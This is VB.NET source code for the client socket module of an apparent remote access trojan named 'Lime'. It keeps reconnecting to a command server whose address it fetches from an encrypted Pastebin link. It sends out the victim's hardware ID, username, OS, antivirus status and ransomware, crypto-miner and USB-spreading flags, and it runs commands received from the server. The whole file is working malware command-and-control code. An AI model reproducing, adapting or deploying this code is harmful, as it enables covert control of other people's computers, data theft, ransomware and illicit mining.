Namespace Lime

    Public Class C_Socket
        Public Shared ENDOF As String = C_Settings.ENDOF
        Public Shared SPL As String = C_Settings.SPL
        Public Shared C As Net.Sockets.TcpClient
        Public Shared R As New Random
        Public Shared T1 As New Threading.Thread(AddressOf Connect)
        Public Shared CNT As Boolean = False

        Public Shared Sub Connect()
            Dim MS As New IO.MemoryStream ' create memory stream
            Dim KA As Integer = 0
re:
            Try
                If C Is Nothing Then GoTo e
                If C.Client.Connected = False Then GoTo e
                If CNT = False Then GoTo e
                KA += 1
                If KA > 500 Then
                    KA = 0
                    ' check if i am still connected
                    If C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then GoTo e
                End If
                If C.Available > 0 Then
                    Dim B(C.Available - 1) As Byte
                    C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                    MS.Write(B, 0, B.Length)
rr:
                    If BS(MS.ToArray).Contains(ENDOF) Then ' split packet..
                        Dim A As Array = SplitWord(MS.ToArray, ENDOF)
                        Dim T As New Threading.Thread(AddressOf C_Commands.Data)
                        T.Start(A(0))
                        MS.Dispose()
                        MS = New IO.MemoryStream
                        If A.Length = 2 Then
                            MS.Write(A(1), 0, A(1).length)
                            GoTo rr
                        End If
                    End If
                End If
            Catch ex As Exception
                GoTo e
            End Try
            Threading.Thread.Sleep(1)
            GoTo re
e:      ' clear things and ReConnect
            CNT = False
            Try
                C.Client.Disconnect(False)
            Catch ex As Exception
            End Try
            Try
                MS.Dispose()
            Catch ex As Exception
            End Try
            MS = New IO.MemoryStream
            Try
                C = New Net.Sockets.TcpClient
                C.SendBufferSize = 999999
                C.ReceiveBufferSize = 999999
                C.ReceiveTimeout = -1
                C.SendTimeout = -1

                KA = 0
#If DEBUG Then
                C_Settings.HOST = "127.0.0.1"
                C_Settings.PORT = 8989
#Else

            Try
                Dim WC As Net.WebClient = New Net.WebClient() 'Pastebin, split by ":" IP:PORT
                Dim reply As String = WC.DownloadString(C_Encryption.AES_Decrypt(C_Settings.Pastebin))
                C_Settings.HOST = reply.Split(":")(0)
                C_Settings.PORT = reply.Split(":")(1)
                WC.Dispose()
            Catch ex As Exception
            End Try
#End If
                C.Client.Connect(C_Settings.HOST, C_Settings.PORT)
                CNT = True
                'Send info to server
                Send(String.Concat("info", SPL, C_ID.HWID, SPL, C_ID.UserName, SPL, "v0.1.8.2F", SPL, C_ID.MyOS, " ", C_ID.Bit, SPL,
                                   C_ID.INDATE, SPL, C_ID.AV, SPL, C_ID.Rans, SPL, C_ID.XMR, SPL, C_ID.USBSP, SPL, "...", SPL, " "))
                Dim P As New Threading.Thread(AddressOf PING)
                P.Start()
            Catch ex As Exception
                Threading.Thread.Sleep(R.Next(5000))
                GoTo e
            End Try
            GoTo re
        End Sub

        Public Shared Sub SendData(ByVal b As Byte())
            If CNT = False Then Exit Sub
            Try
                Dim r As Object = New IO.MemoryStream
                r.Write(b, 0, b.Length)
                r.Write(SB(ENDOF), 0, ENDOF.Length)
                C.Client.Send(r.ToArray, 0, r.Length, Net.Sockets.SocketFlags.None)
                r.Dispose()
            Catch ex As Exception
                CNT = False
            End Try
        End Sub

        Public Shared Sub Send(ByVal S As String)
            SendData(SB(C_Encryption.AES_Encrypt(S)))
        End Sub

        Public Shared _stop As Boolean = False
        Public Shared _start As Boolean = False
        Public Shared MS As Integer = 0
        Public Shared Sub PING(sock As Integer)
re:
            Try
                If CNT = False Then MS = 0 : Exit Sub
                If _start Then
                    MS += 1
                    If _stop Then
                        Send("!P" + SPL + MS.ToString)
                        MS = 0
                        _start = False
                        _stop = False
                    End If
                End If
                    Threading.Thread.Sleep(1)
            Catch : End Try
            GoTo re
        End Sub

    End Class

End Namespace
